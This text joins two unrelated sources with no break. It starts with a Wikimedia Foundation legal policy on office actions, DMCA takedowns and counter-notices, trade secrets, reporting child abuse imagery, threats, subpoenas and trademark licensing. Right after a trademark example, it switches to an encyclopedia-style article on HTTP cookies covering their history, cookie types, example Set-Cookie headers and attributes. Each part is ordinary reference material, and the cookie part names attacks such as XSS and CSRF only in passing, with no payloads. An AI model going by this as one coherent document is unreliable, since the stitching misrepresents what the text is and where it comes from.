Office actions are official changes made on behalf of the Wikimedia Foundation by certain authorized members of the office. These are removals of questionable or illegal Project content following complaints. Office actions are performed so that the end result is a legal, policy-compliant article on the subject. For a full explanation of office actions, see: Office actions.

Office actions are extremely rare. Before an office action may be taken, the following requirements must be met:

 * A formal complaint must be filed “off-wiki” (e.g., postal mail, email, telephone, or personal meetings).

 * The complaint must relate to a violation of law that raises significant legal liability if an office action is not taken.

 * Community efforts to delete the offensive material have been unsuccessful (or there is insufficient time for such efforts).

Only certain individuals have authority to initiate an office action. See Office actions. As a general matter, all persons are invited to seek a recommendation from the Office of the General Counsel before proceeding with an office action.

No Editing. Importantly, when undertaking an office action, the authorized employee from the Wikimedia Foundation may only delete content (such as stubbing an article). Generally, that employee should not engage in adding new content or proactive editing of the content.

Specific office actions include the following:

1. DMCA Takedowns. The Office of the General Counsel (OGC) shall have the sole responsibility to authorize a takedown of content due to a DMCA takedown notice. (The Community however is always free to remove infringing content on its own accord.) Such a DMCA takedown may not be reverted.

Before a DMCA takedown notice will be recognized, the complaining copyright holder must substantially comply with all legal requirements of such a notice:

 * A physical or electronic signature of a person authorized to act on behalf of the copyright owner or exclusive licensee.

 * Identification of the copyrighted work claimed to be infringed. If a notice refers to multiple works posted at a single location, it is sufficient to include a representative list of works infringed at the site.

 * Identification of the material claimed to be infringing together with “information reasonably sufficient to permit the service provider to locate the material.” The notification must also identify the reference or link to the material or activity claimed to be infringing and information “reasonably sufficient” to permit the service provider to locate the reference or link.

 * Information “reasonably sufficient” to permit the service provider to contact the complaining party. Such information may include the complaining party's address, telephone or email address.

 * A statement that the complaining party believes, in good faith, that the copyrighted material identified is being used in a manner that is not authorized by “the copyright owner, its agent, or the law.”

 * A statement that the information in the notification is accurate, and under penalty of perjury, that the complaining party is authorized to act on behalf of the owner of an exclusive right that is allegedly infringed.

I. Ballon, E-Commerce & Internet Law, section 4.12[9][B] (from which the above is substantively quoted).

Upon takedown of the content, the Office of the General Counsel should promptly notify the user who had posted the content (through email or notice on the user page) that the content has been removed and that the user may file a counter-notification. That notice will link to a page summarizing DMCA takedown and counter-notice procedures. See, e.g., https://lumendatabase.org/topics/29 & https://wikimediafoundation.org/wiki/Category:DMCA (listing resources under DMCA subtitle). Unfortunately, a user cannot file a counter-notification anonymously.

Should the Wikimedia Foundation receive a counter-notification, the Office of the General Counsel should promptly provide the original complaining party with (1) a copy of any counter-notification and (2) a notice that the removed content will be replaced within ten (10) business days. This provides the original complaining party an opportunity to file suit to obtain an order restraining the infringing activity.

Without notice that a lawsuit has been filed, the Office of the General Counsel will authorize that the removed content be replaced within 10-14 business days following receipt of the counter-notification. Only the Office of the General Counsel may authorize the reposting of the removed content.

Any DMCA takedown should be replaced by a template explaining the action taken. The DMCA takedown notice should be posted on our site. See, e.g., Office actions. The post should include information on how to file a counter-notification, including a link for detailed information on that procedure. See, e.g., https://lumendatabase.org/topics/29 & Office actions (listing resources under DMCA subtitle).

All DMCA takedowns should be forwarded to https://lumendatabase.org.

Repeat Infringers. Pursuant to the DMCA, the Wikimedia Foundation will terminate, in appropriate circumstances, the accounts of repeat infringers.

The Wikimedia Foundation strongly encourages users to file counter-notifications when a DMCA takedown demand is invalid or improper. Successful counter-notifications will not be counted in any determination as to whether a user is a repeat offender.

Example: A user posts a photograph, and a rights-owner files a DMCA takedown notice. The user disagrees and files a counter-notification, and the rights-owner fails to challenge that counter-notification in court. The photograph will be reposted 10-14 days after receipt of the counter-notification. The DMCA takedown will not count against the user in determining repeat infringer status. (The Community, however, has the option to delete the photograph according to their Project policies since those policies may be more stringent than copyright laws.)

2. Knowledge of Copyright Infringement. Apart from the DMCA takedown procedure, the Office of the General Counsel should authorize deletion of content where there is (1) actual knowledge that the content is infringing copyright or (2) awareness of facts or circumstances from which copyright infringing activity is apparent. (17 U.S.C. 512(c)(1)(A)). Pursuant to the DMCA, the Wikimedia Foundation will terminate, in appropriate circumstances, the accounts of repeat infringers. The Community may also remove such infringing material from the Project sites.

3. Trade Secrets. If there is specific and credible knowledge that trade secrets, such as cracks and decryption keys, are on our site, the Office of General Counsel may take an office action and authorize prompt deletion of those secrets. Apart from an office action, the Community may also take down trade secrets as the Community deems appropriate. Notice of such takedowns is not necessary.

Under the Uniform Trade Secrets Act, a trade secret includes:

[I]nformation, including a formula, pattern, compilation, program, device, method, technique, or process, that ... derives independent economic value, actual or potential, from not being generally known to, and not being readily ascertainable by proper means by, other persons who can obtain economic value from its disclosure or use, and is the subject of efforts that are reasonable under the circumstances to maintain its secrecy.

Under that Act, “misappropriation” includes “disclosure . . . of a trade secret of another without express or implied consent by a person who . . . before a material change of his position, knew or had reason to know that it was a trade secret and that knowledge of it had been acquired by accident or mistake.”

There must be reasonable efforts to keep the information secret before it may constitute a “trade secret.” One legal scholar noted, “the amount of time that a secret is made publicly available online and the location where it is posted should be considered in evaluating whether a disclosure has been made that destroys the trade secret. For example, a brief disclosure in an obscure location that in fact was not widely accessed should not be deemed to destroy the trade secret status of information.” I. Ballon, E-Commerce & Internet Law, Section 10.06. On the other hand, an alleged "trade secret" that has been widely published in multiple media may have lost its requisite secrecy.

In many cases, the verifiability policy may justify independently the deletion of the alleged trade secret because there is no support for it in a reliable published source. See, e.g., Wikipedia:Verifiability. On the other hand, removal generally would be inappropriate with respect to former confidences that are legitimately discussed in reliable, public sources as a matter of general interest.

Example: Without authorization, a user posts the specifications of an upcoming product from his company. There are two reasons why this contribution may be deleted: (1) it constitutes trade secrets; and (2) it is not verifiable (that is, there is no reliable, published source as a reference).

4. Trademark Infringement. If we receive notice of trademark infringement, the Office of the General Counsel may authorize removal of such infringement when the infringement is clear and apparent (like a clear-cut case of piracy) or when otherwise permitted by law. The Community also may review the infringement and determine whether removal is appropriate under applicable law. Notice of such a takedown is not necessary.

Example: A user includes a company logo on his user page that incorrectly proclaims that the company is associated with the user's business. The company contacts the Wikimedia Foundation and presents convincing evidence that the company logo is being misused without authorization. The Office of General Counsel may authorize removal of the company logo from the user page. The Community also may review and determine whether removal is appropriate.
5. Child Pornography. Child pornography must be removed from the site immediately. Generally speaking, child pornography constitutes a photograph or other visual image of a child engaged in sexually explicit conduct.[3]

It is important to note that depictions such as drawings, cartoons, sculptures, or paintings that represent children in sexually explicit conduct may run afoul of certain obscenity statutes if the depictions lack certain cultural or social value. See 18 U.S.C. 1466A.

Relevant federal statutes on child pornography – with corresponding definitions -- may be found here: https://www.justice.gov/criminal-ceos/citizens-guide-us-federal-law-child-pornography State laws may also be applicable.[4]

As soon as possible, as required by law, the Legal and Community Advocacy department should report any discovery of child pornography (as described above) to the National Center for Missing and Exploited Children (800-843-5678). See 18 U.S.C. 2258A Reports to other law enforcement agencies may be appropriate depending on the circumstances.

Community members who find child pornography on the site may delete and report it by email to legal-reportswikimedia.org. Community members are asked to notify Legal and Community Advocacy about any child pornography found on the site to ensure it is properly reported to the authorities.

Even when reporting, Community members are advised not to store or send images of child pornography through any means, including snail mail or email, unless pursuant to police instructions.

6. Threats. Our WMF staff manual (entitled On-Wiki Threat Protocol) should govern our actions vis-a-vis threats, such as suicide threats and threats of violence (e.g., bomb threats and threats of harm to third parties). This manual applies to both U.S. and international threats.

Under our privacy policy, Legal and Community Advocacy may release information to law enforcement "[w]here it is reasonably necessary to protect the rights, property or safety of the Wikimedia Foundation, its users or the public." Legal and Community Advocacy should notify the General Counsel of any such disclosure.

7. Biographies of Living Persons and Defamation. As a general matter, disputes regarding biographies of living persons or defamation should be resolved by the Community, including the Volunteer Response Team (VRT). See Wikipedia:Biographies of living persons (or equivalent policies in other Projects). An office action by the Wikimedia Foundation – which should be approved by the Office of the General Counsel -- may be appropriate if community actions have not been effective and legal considerations require such action.

If the defamation claim is the subject of a legal action, the Office of the General Counsel will review the case. In cases where a complainant's attorney expresses willingness to work with the Wikimedia Foundation, the Office of the General Counsel may request the Volunteer Response Team (VRT) to appoint a volunteer to work on improving the article in question.

Example: The legal counsel of the subject of a biography threatens a lawsuit unless certain content is removed. After talking to the Office of the General Counsel, the legal counsel expresses a willingness to work with a volunteer to correct the biography. The Office of General Counsel may request a member of the Email Response Team to appoint a volunteer to work on improving the article.


FAIR USE

Many Wikimedia Projects include only material that is available under a free content license and do not allow for fair use, such as Wikimedia Commons. (See Commons:Fair use.) Other Projects have policies that are stricter than legal “fair use” in the United States. See, e.g., Wikipedia:Non-free content. Furthermore, a number of language sites may vary from their English counterpart Project and do not allow for “fair use” (like the Spanish or German language Wikipedias).

The legal determination of “fair use” is an extremely complicated analysis that depends on a wide variety of factors. As the U.S. Copyright Office has noted: “The distinction between fair use and infringement may be unclear and not easily defined. There is no specific number of words, lines, or notes that may safely be taken without permission.” http://www.copyright.gov/fls/fl102.html Moreover, many countries do not recognize fair use or have much more narrow definitions.

The Wikimedia Foundation generally will not provide legal advice to users as to whether certain materials constitute fair use. To assist the user, however, the Wikimedia Foundation may refer inquiries to the appropriate policy relating to the Project in question. See, e.g., Wikipedia:Non-free content. Also, when fair use is relevant to the discussion, the Wikimedia Foundation may direct users to respected sites that provide background information on fair use in the United States. See, e.g., http://fairuse.stanford.edu/Copyright_and_Fair_Use_Overview/chapter9/index.html ; http://w2.eff.org/IP/eff_fair_use_faq.php

Example: The Office of the General Counsel receives a request from a community member as to whether or not a photo on English Wikipedia constitutes “fair use.” The Office of the General Counsel should not offer specific legal advice on whether the use of the photograph is “fair use.” The decision is that of the community member, not the Office of the General Counsel. However, the Office of the General Counsel may refer the member to the relevant Project policy on Non-free content and to well regarded websites that discuss “fair use” (including those already linked on the Project policy).


HARASSMENT

If a user complains about harassment on any of the Projects, the user should be advised to contact an administrator. In appropriate cases, such as legal threats, threats of violence, or outing, Communities may create policies that provide for protective blocks by administrators without prior warnings. See, e.g., Wikipedia:Harassment & Wikipedia:No personal attacks.

In cases of serious harassment, involving, for example, credible threats of violence, users should contact their local police. The report usually may be made in the jurisdiction of the victim, perpetrator, or threat. The Wikimedia Foundation will fully cooperate in investigations involving harassment of users that include credible threats of violence. Users, however, must report the harassment to local police. (Our experience is that local police usually refuse to receive reports directly from the Wikimedia Foundation).

Under the Privacy Policy, the Wikimedia Foundation may disclose user information to the police “[w]here it is reasonably necessary to protect the rights, property or safety of the Wikimedia Foundation, its users or the public.”

Example: A user has received contributions on her talk page where another user has threatened to burn down her home. The threat appears credible. The victim of the threat should contact her local police and report the incident. (She could also report it to the police department where the perpetrator is located.) The Wikimedia Foundation would appreciate if the user contacted the Foundation to provide a “heads up” on the police report. The Foundation will cooperate fully with the police, and may disclose the personal information on the user who was making the threats as allowed by the Privacy Policy.


LITIGATION

Any summons, complaint, contentious legal letter, or other legal document directed to the Wikimedia Foundation should be forwarded to the Office of the General Counsel immediately.

Example: A letter is delivered to the Community department threatening a lawsuit based on a user dispute with the Wikimedia Foundation. A copy of that letter should be forwarded to the Office of the General Counsel immediately.


SUBPOENAS

The Office of the General Counsel will have the responsibility of responding to subpoenas and court orders issued by a U.S. court. The Office will determine, based on the facts, whether to respond to or contest the subpoena or order. Notice to a user about a civil subpoena should be provided (when possible) as stated in our Privacy Policy. See http://wikimediafoundation.org/wiki/Privacy_policy Usually such notice should be provided approximately 10 days before compliance with the civil subpoena to allow the user to seek a quashing of the subpoena.

As a general rule, the Wikimedia Foundation may not recognize a foreign subpoena or order. Foreign parties will be asked to obtain a U.S. equivalent before we recognize such a subpoena. See 28 U.S.C. 1782.

Exception: As a courtesy, the Wikimedia Foundation may recognize a foreign subpoena or order if the information sought is needed by police in an investigation that involves an immediate threat to life or limb. User information may be released without a subpoena “[w]here it is reasonably necessary to protect the rights, property or safety of the Wikimedia Foundation, its users or the public.”

Example: The Wikimedia Foundation receives a subpoena from London to disclose user information to support an ongoing civil lawsuit there. As a general rule, the Foundation may not recognize the foreign subpoena. The party should obtain a U.S. equivalent subpoena as allowed under 28 U.S.C. 1782.

Example: The Wikimedia Foundation receives an urgent phone call from the Australian police, indicating that the biography of a living local politician shows an assassination date two days later. As a courtesy, the Wikimedia Foundation may recognize a foreign subpoena asking for the identifying information of the user who posted the assassination date. The Wikimedia Foundation may also choose to disclose the information without a subpoena if “reasonably necessary to protect the . . . safety of the Wikimedia Foundation, its users or the public.”


TRADEMARK LICENSING

Our trademark licensing must remain consistent with our mission “to empower and engage people around the world to collect and develop educational content under a free license or in the public domain, and to disseminate it effectively and globally.” As stated in our trademark policy, the Wikimedia Foundation has a need “to ensure that the Wikimedia Marks remain reliable indicators of free content . . . and source/origin.” http://wikimediafoundation.org/wiki/Trademark_Policy More detailed explanation of these values can be found here: http://wikimediafoundation.org/wiki/Values

In a nutshell, in deciding whether a trademark license is appropriate, we need to ensure that we are comfortable associating our brand with another party's reputation and their proposed specific uses. Relevant factors include:

 * The likelihood that the license will increase the Wikimedia Foundation's access to a new segment of users who would benefit from open knowledge and free access to information;

 * The likelihood that the license will increase the number of editors on the Wikimedia Projects;
 * The means by which the licensing relationship furthers the Wikimedia Foundation's mission in general;

 * The licensing party's position and reputation with respect to open knowledge and free access to information (cf. Project Gutenberg);

 * The licensing party's position and reputation with respect to the free and open source movement in general, including the use of freely-licensed tools;

 * The licensing party's reputation with respect to social responsibility in general; and

 * The importance of ensuring that the Wikimedia Foundation stays free of influence in the way it operates.

Commercial uses of our brand are acceptable if relevant considerations support the license.

Non-exclusivity. To ensure world-wide, unrestricted, dissemination of knowledge, we do not enter into exclusive agreements on the use of our trademarks.

Examples: A local group wishes to print T-shirts with the Wikipedia puzzle globe as an effort to promote free content in society. The Wikimedia Foundation will evaluate the context of the use. The reputation of the group will also be a key factor. How the T-shirts would be distributed would be another consideration. If the distribution of the T-shirts would advance the mission and not harm the good reputation of the Wikimedia Foundation, licensing may be permitted.

HTTP cookie (also called web cookie, Internet cookie, browser cookie, or simply cookie) is a small block of data created by a web server while a user is browsing a website and placed on the user's computer or other device by the user's web browser. Cookies are placed on the device used to access a website, and more than one cookie may be placed on a user's device during a session.

Cookies serve useful and sometimes essential functions on the web. They enable web servers to store stateful information (such as items added in the shopping cart in an online store) on the user's device or to track the user's browsing activity (including clicking particular buttons, logging in, or recording which pages were visited in the past).[1] They can also be used to save information that the user previously entered into form fields, such as names, addresses, passwords, and payment card numbers for subsequent use.

Authentication cookies are commonly used by web servers to authenticate that a user is logged in, and with which account they are logged in. Without the cookie, users would need to authenticate themselves by logging in on each page containing sensitive information that they wish to access. The security of an authentication cookie generally depends on the security of the issuing website and the user's web browser, and on whether the cookie data is encrypted. Security vulnerabilities may allow a cookie's data to be read by an attacker, used to gain access to user data, or used to gain access (with the user's credentials) to the website to which the cookie belongs (see cross-site scripting and cross-site request forgery for examples).[2]

Tracking cookies, and especially third-party tracking cookies, are commonly used as ways to compile long-term records of individuals' browsing histories — a potential privacy concern that prompted European[3] and U.S. lawmakers to take action in 2011.[4][5] European law requires that all websites targeting European Union member states gain "informed consent" from users before storing non-essential cookies on their device.


BACKGROUND


ORIGIN OF THE NAME

HTTP cookies share their name with a popular baked treat.

The term cookie was coined by web-browser programmer Lou Montulli. It was derived from the term magic cookie, which is a packet of data a program receives and sends back unchanged, used by Unix programmers.[6][7]


HISTORY

Magic cookies were already used in computing when computer programmer Lou Montulli had the idea of using them in web communications in June 1994.[8] At the time, he was an employee of Netscape Communications, which was developing an e-commerce application for MCI. Vint Cerf and John Klensin represented MCI in technical discussions with Netscape Communications. MCI did not want its servers to have to retain partial transaction states, which led them to ask Netscape to find a way to store that state in each user's computer instead. Cookies provided a solution to the problem of reliably implementing a virtual shopping cart.[9][10]

Together with John Giannandrea, Montulli wrote the initial Netscape cookie specification the same year. Version 0.9beta of Mosaic Netscape, released on October 13, 1994,[11][12] supported cookies.[10] The first use of cookies (out of the labs) was checking whether visitors to the Netscape website had already visited the site. Montulli applied for a patent for the cookie technology in 1995, which was granted in 1998.[13] Support for cookies was integrated with Internet Explorer in version 2, released in October 1995.[14]

The introduction of cookies was not widely known to the public at the time. In particular, cookies were accepted by default, and users were not notified of their presence.[15] The public learned about cookies after the Financial Times published an article about them on February 12, 1996.[16] In the same year, cookies received a lot of media attention, especially because of potential privacy implications. Cookies were discussed in two U.S. Federal Trade Commission hearings in 1996 and 1997.[2]

The development of the formal cookie specifications was already ongoing. In particular, the first discussions about a formal specification started in April 1995 on the www-talk mailing list. A special working group within the Internet Engineering Task Force (IETF) was formed. Two alternative proposals for introducing state in HTTP transactions had been proposed by Brian Behlendorf and David Kristol respectively. But the group, headed by Kristol himself and Lou Montulli, soon decided to use the Netscape specification as a starting point. In February 1996, the working group identified third-party cookies as a considerable privacy threat. The specification produced by the group was eventually published as RFC 2109 in February 1997. It specifies that third-party cookies were either not allowed at all, or at least not enabled by default.[17] At this time, advertising companies were already using third-party cookies. The recommendation about third-party cookies of RFC 2109 was not followed by Netscape and Internet Explorer. RFC 2109 was superseded by RFC 2965 in October 2000.

RFC 2965 added a Set-Cookie2 header field, which informally came to be called "RFC 2965-style cookies" as opposed to the original Set-Cookie header field which was called "Netscape-style cookies".[18][19] Set-Cookie2 was seldom used, however, and was deprecated in RFC 6265 in April 2011 which was written as a definitive specification for cookies as used in the real world.[20] No modern browser recognizes the Set-Cookie2 header field.[21]


TERMINOLOGY

This section needs additional citations for verification. Please help improve this article by adding citations to reliable sources in this section. Unsourced material may be challenged and removed. (August 2011) (Learn how and when to remove this message)


SESSION COOKIE

A session cookie (also known as an in-memory cookie, transient cookie or non-persistent cookie) exists only in temporary memory while the user navigates a website.[22] Session cookies expire or are deleted when the user closes the web browser.[23] Session cookies are identified by the browser by the absence of an expiration date assigned to them.


PERSISTENT COOKIE

A persistent cookie expires at a specific date or after a specific length of time. For the persistent cookie's lifespan set by its creator, its information will be transmitted to the server every time the user visits the website that it belongs to, or every time the user views a resource belonging to that website from another website (such as an advertisement).

For this reason, persistent cookies are sometimes referred to as tracking cookies[24][25] because they can be used by advertisers to record information about a user's web browsing habits over an extended period of time. Persistent cookies are also used for reasons such as keeping users logged into their accounts on websites, to avoid re-entering login credentials at every visit. (See § Uses, below.)


SECURE COOKIE

A secure cookie can only be transmitted over an encrypted connection (i.e. HTTPS). They cannot be transmitted over unencrypted connections (i.e. HTTP). This makes the cookie less likely to be exposed to cookie theft via eavesdropping. A cookie is made secure by adding the Secure flag to the cookie.


HTTP-ONLY COOKIE

An http-only cookie cannot be accessed by client-side APIs, such as JavaScript. This restriction eliminates the threat of cookie theft via cross-site scripting (XSS).[26] However, the cookie remains vulnerable to cross-site tracing (XST) and cross-site request forgery (CSRF) attacks. A cookie is given this characteristic by adding the HttpOnly flag to the cookie.


SAME-SITE COOKIE

In 2016 Google Chrome version 51 introduced[27] a new kind of cookie with attribute SameSite with possible values of Strict, Lax or None.[28] With attribute SameSite=Strict, the browsers would only send cookies to a target domain that is the same as the origin domain. This would effectively mitigate cross-site request forgery (CSRF) attacks. With SameSite=Lax, browsers would send cookies with requests to a target domain even it is different from the origin domain, but only for safe requests such as GET (POST is unsafe) and not third-party cookies (inside iframe). Attribute SameSite=None would allow third-party (cross-site) cookies, however, most browsers require secure attribute on SameSite=None cookies.[29]

The Same-site cookie is incorporated into a new RFC draft for "Cookies: HTTP State Management Mechanism"[30] to update RFC 6265 (if approved).

Chrome, Firefox, and Edge started to support Same-site cookies.[31] The key of rollout is the treatment of existing cookies without the SameSite attribute defined, Chrome has been treating those existing cookies as if SameSite=None, this would let all website/applications run as before. Google intended to change that default to SameSite=Lax in Chrome 80 planned to be released in February 2020,[32] but due to potential for breakage of those applications/websites that rely on third-party/cross-site cookies and COVID-19 circumstances, Google postponed this change to Chrome 84.[33][34]


SUPERCOOKIE

A supercookie is a cookie with an origin of a top-level domain (such as .com) or a public suffix (such as .co.uk). Ordinary cookies, by contrast, have an origin of a specific domain name, such as example.com.

Supercookies can be a potential security concern and are therefore often blocked by web browsers. If unblocked by the browser, an attacker in control of a malicious website could set a supercookie and potentially disrupt or impersonate legitimate user requests to another website that shares the same top-level domain or public suffix as the malicious website. For example, a supercookie with an origin of .com could maliciously affect a request made to example.com, even if the cookie did not originate from example.com. This can be used to fake logins or change user information.

The Public Suffix List[35] helps to mitigate the risk that supercookies pose. The Public Suffix List is a cross-vendor initiative that aims to provide an accurate and up-to-date list of domain name suffixes. Older versions of browsers may not have an up-to-date list, and will therefore be vulnerable to supercookies from certain domains.

OTHER USES

The term supercookie is sometimes used for tracking technologies that do not rely on HTTP cookies. Two such supercookie mechanisms were found on Microsoft websites in August 2011: cookie syncing that respawned MUID (machine unique identifier) cookies, and ETag cookies.[36] Due to media attention, Microsoft later disabled this code.[37] In a 2021 blog post, Mozilla used the term supercookie to refer to the use of browser cache as a means of tracking users across sites.[38]


ZOMBIE COOKIE

Main articles: Zombie cookie and Evercookie

A zombie cookie is data and code that has been placed by a web server on a visitor's computer or other device in a hidden location outside the visitor's web browser's dedicated cookie storage location, and that automatically recreates a HTTP cookie as a regular cookie after the original cookie had been deleted. The zombie cookie may be stored in multiple locations, such as Flash Local shared object, HTML5 Web storage, and other client-side and even server-side locations, and when absence is detected in one of the locations, the missing instance is recreated by the JavaScript code using the data stored in other locations.[39][40]


COOKIE WALL

A cookie wall pops up on a website and informs the user of the website's cookie usage. It has no reject option, and the website is not accessible without tracking cookies.


STRUCTURE

A cookie consists of the following components:[41][42][43]

 1. Name
 2. Value
 3. Zero or more attributes (name/value pairs). Attributes store information such as the cookie's expiration, domain, and flags (such as Secure and HttpOnly).


USES


SESSION MANAGEMENT

Cookies were originally introduced to provide a way for users to record items they want to purchase as they navigate throughout a website (a virtual shopping cart or shopping basket).[9][10] Today, however, the contents of a user's shopping cart are usually stored in a database on the server, rather than in a cookie on the client. To keep track of which user is assigned to which shopping cart, the server sends a cookie to the client that contains a unique session identifier (typically, a long string of random letters and numbers). Because cookies are sent to the server with every request the client makes, that session identifier will be sent back to the server every time the user visits a new page on the website, which lets the server know which shopping cart to display to the user.

Another popular use of cookies is for logging into websites. When the user visits a website's login page, the web server typically sends the client a cookie containing a unique session identifier. When the user successfully logs in, the server remembers that that particular session identifier has been authenticated and grants the user access to its services.

Because session cookies only contain a unique session identifier, this makes the amount of personal information that a website can save about each user virtually limitless—the website is not limited to restrictions concerning how large a cookie can be. Session cookies also help to improve page load times, since the amount of information in a session cookie is small and requires little bandwidth.


PERSONALIZATION

Cookies can be used to remember information about the user in order to show relevant content to that user over time. For example, a web server might send a cookie containing the username that was last used to log into a website, so that it may be filled in automatically the next time the user logs in.

Many websites use cookies for personalization based on the user's preferences. Users select their preferences by entering them in a web form and submitting the form to the server. The server encodes the preferences in a cookie and sends the cookie back to the browser. This way, every time the user accesses a page on the website, the server can personalize the page according to the user's preferences. For example, the Google search engine once used cookies to allow users (even non-registered ones) to decide how many search results per page they wanted to see. Also, DuckDuckGo uses cookies to allow users to set the viewing preferences like colors of the web page.


TRACKING

See also: Web tracking

Tracking cookies are used to track users' web browsing habits. This can also be done to some extent by using the IP address of the computer requesting the page or the referer field of the HTTP request header, but cookies allow for greater precision. This can be demonstrated as follows:

 1. If the user requests a page of the site, but the request contains no cookie, the server presumes that this is the first page visited by the user. So the server creates a unique identifier (typically a string of random letters and numbers) and sends it as a cookie back to the browser together with the requested page.
 2. From this point on, the cookie will automatically be sent by the browser to the server every time a new page from the site is requested. The server not only sends the page as usual but also stores the URL of the requested page, the date/time of the request, and the cookie in a log file.

By analyzing this log file, it is then possible to find out which pages the user has visited, in what sequence, and for how long.

Corporations exploit users' web habits by tracking cookies to collect information about buying habits. The Wall Street Journal found that America's top fifty websites installed an average of sixty-four pieces of tracking technology onto computers, resulting in a total of 3,180 tracking files.[44] The data can then be collected and sold to bidding corporations.


IMPLEMENTATION

A possible interaction between a web browser and a web server holding a web page in which the server sends a cookie to the browser and the browser sends it back when requesting another page

Cookies are arbitrary pieces of data, usually chosen and first sent by the web server, and stored on the client computer by the web browser. The browser then sends them back to the server with every request, introducing states (memory of previous events) into otherwise stateless HTTP transactions. Without cookies, each retrieval of a web page or component of a web page would be an isolated event, largely unrelated to all other page views made by the user on the website. Although cookies are usually set by the web server, they can also be set by the client using a scripting language such as JavaScript (unless the cookie's HttpOnly flag is set, in which case the cookie cannot be modified by scripting languages).

The cookie specifications[45][46] require that browsers meet the following requirements in order to support cookies:

 * Can support cookies as large as 4,096 bytes in size.
 * Can support at least 50 cookies per domain (i.e. per website).
 * Can support at least 3,000 cookies in total.


SETTING A COOKIE

Cookies are set using the Set-Cookie header field, sent in an HTTP response from the web server. This header field instructs the web browser to store the cookie and send it back in future requests to the server (the browser will ignore this header field if it does not support cookies or has disabled cookies).

As an example, the browser sends its first HTTP request for the homepage of the www.example.org website:

GET /index.html HTTP/1.1
Host: www.example.org
...


The server responds with two Set-Cookie header fields:

HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: theme=light
Set-Cookie: sessionToken=abc123; Expires=Wed, 09 Jun 2021 10:18:14 GMT
...


The server's HTTP response contains the contents of the website's homepage. But it also instructs the browser to set two cookies. The first, theme, is considered to be a session cookie since it does not have an Expires or Max-Age attribute. Session cookies are intended to be deleted by the browser when the browser closes. The second, sessionToken, is considered to be a persistent cookie since it contains an Expires attribute, which instructs the browser to delete the cookie at a specific date and time.

Next, the browser sends another request to visit the spec.html page on the website. This request contains a Cookie header field, which contains the two cookies that the server instructed the browser to set:

GET /spec.html HTTP/1.1
Host: www.example.org
Cookie: theme=light; sessionToken=abc123
…


This way, the server knows that this HTTP request is related to the previous one. The server would answer by sending the requested page, possibly including more Set-Cookie header fields in the HTTP response in order to instruct the browser to add new cookies, modify existing cookies, or remove existing cookies. To remove a cookie, the server must include a Set-Cookie header field with an expiration date in the past.

The value of a cookie may consist of any printable ASCII character (! through ~, Unicode \u0021 through \u007E) excluding ,and; and whitespace characters. The name of a cookie excludes the same characters, as well as =, since that is the delimiter between the name and value. The cookie standard RFC 2965 is more restrictive but not implemented by browsers.

The term cookie crumb is sometimes used to refer to a cookie's name–value pair.[47]

Cookies can also be set by scripting languages such as JavaScript that run within the browser. In JavaScript, the object document.cookie is used for this purpose. For example, the instruction document.cookie = "temperature=20" creates a cookie of name temperature and value 20.[48]


COOKIE ATTRIBUTES

In addition to a name and value, cookies can also have one or more attributes. Browsers do not include cookie attributes in requests to the server—they only send the cookie's name and value. Cookie attributes are used by browsers to determine when to delete a cookie, block a cookie or whether to send a cookie to the server.

DOMAIN AND PATH

The Domain and Path attributes define the scope of the cookie. They essentially tell the browser what website the cookie belongs to. For security reasons, cookies can only be set on the current resource's top domain and its subdomains, and not for another domain and its subdomains. For example, the website example.org cannot set a cookie that has a domain of foo.com because this would allow the website example.org to control the cookies of the domain foo.com.

If a cookie's Domain and Path attributes are not specified by the server, they default to the domain and path of the resource that was requested.[49] However, in most browsers there is a difference between a cookie set from foo.com without a domain, and a cookie set with the foo.com domain. In the former case, the cookie will only be sent for requests to foo.com, also known as a host-only cookie. In the latter case, all subdomains are also included (for example, docs.foo.com).[50][51] A notable exception to this general rule is Edge prior to Windows 10 RS3 and Internet Explorer prior to IE 11 and Windows 10 RS4 (April 2018), which always sends cookies to subdomains regardless of whether the cookie was set with or without a domain.[52]

Below is an example of some Set-Cookie header fields in the HTTP response of a website after a user logged in. The HTTP request was sent to a webpage within the docs.foo.com subdomain:

HTTP/1.0 200 OK
Set-Cookie: LSID=DQAAAK…Eaem_vYg; Path=/accounts; Expires=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly
Set-Cookie: HSID=AYQEVn…DKrdst; Domain=.foo.com; Path=/; Expires=Wed, 13 Jan 2021 22:23:01 GMT; HttpOnly
Set-Cookie: SSID=Ap4P…GTEq; Domain=foo.com; Path=/; Expires=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly
…


The first cookie, LSID, has no Domain attribute, and has a Path attribute set to /accounts. This tells the browser to use the cookie only when requesting pages contained in docs.foo.com/accounts (the domain is derived from the request domain). The other two cookies, HSID and SSID, would be used when the browser requests any subdomain in .foo.com on any path (for example www.foo.com/bar). The prepending dot is optional in recent standards, but can be added for compatibility with RFC 2109 based implementations.[53]

EXPIRES AND MAX-AGE

The Expires attribute defines a specific date and time for when the browser should delete the cookie. The date and time are specified in the form Wdy, DD Mon YYYY HH:MM:SS GMT, or in the form Wdy, DD Mon YY HH:MM:SS GMT for values of YY where YY is greater than or equal to 0 and less than or equal to 69.[54]

Alternatively, the Max-Age attribute can be used to set the cookie's expiration as an interval of seconds in the future, relative to the time the browser received the cookie. Below is an example of three Set-Cookie header fields that were received from a website after a user logged in:

HTTP/1.0 200 OK
Set-Cookie: lu=Rg3vHJZnehYLjVg7qi3bZjzg; Expires=Tue, 15 Jan 2013 21:47:38 GMT; Path=/; Domain=.example.com; HttpOnly
Set-Cookie: made_write_conn=1295214458; Path=/; Domain=.example.com
Set-Cookie: reg_fb_gate=deleted; Expires=Thu, 01 Jan 1970 00:00:01 GMT; Path=/; Domain=.example.com; HttpOnly


The first cookie, lu, is set to expire sometime on 15 January 2013. It will be used by the client browser until that time. The second cookie, made_write_conn, does not have an expiration date, making it a session cookie. It will be deleted after the user closes their browser. The third cookie, reg_fb_gate, has its value changed to deleted, with an expiration time in the past. The browser will delete this cookie right away because its expiration time is in the past. Note that cookie will only be deleted if the domain and path attributes in the Set-Cookie field match the values used when the cookie was created.

As of 2016[update] Internet Explorer did not support Max-Age.[55][56]

SECURE AND HTTPONLY

The Secure and HttpOnly attributes do not have associated values. Rather, the presence of just their attribute names indicates that their behaviors should be enabled.

The Secure attribute is meant to keep cookie communication limited to encrypted transmission, directing browsers to use cookies only via secure/encrypted connections. However, if a web server sets a cookie with a secure attribute from a non-secure connection, the cookie can still be intercepted when it is sent to the user by man-in-the-middle attacks. Therefore, for maximum security, cookies with the Secure attribute should only be set over a secure connection.

